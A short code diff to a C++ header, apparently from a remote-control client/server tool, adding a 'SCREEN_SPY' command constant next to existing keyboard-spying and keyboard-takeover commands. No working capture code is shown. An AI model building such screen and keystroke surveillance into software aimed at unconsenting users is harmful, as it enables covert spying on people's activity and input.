@@ -20,7 +20,7 @@ public:
     HINSTANCE hInst;    // 本应用程序的实例句柄
 
     // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
-
+    const std::string CmdScreenSpy = "SCREEN_SPY";
     const std::string CmdKeyboardSpy = "KEYBOARD_SPY";
     const std::string CmdKeyboardStop = "KEYBOARD_Stop";
     const std::string CmdKeyboardTakeOver = "KEYBOARD_TakeOver";
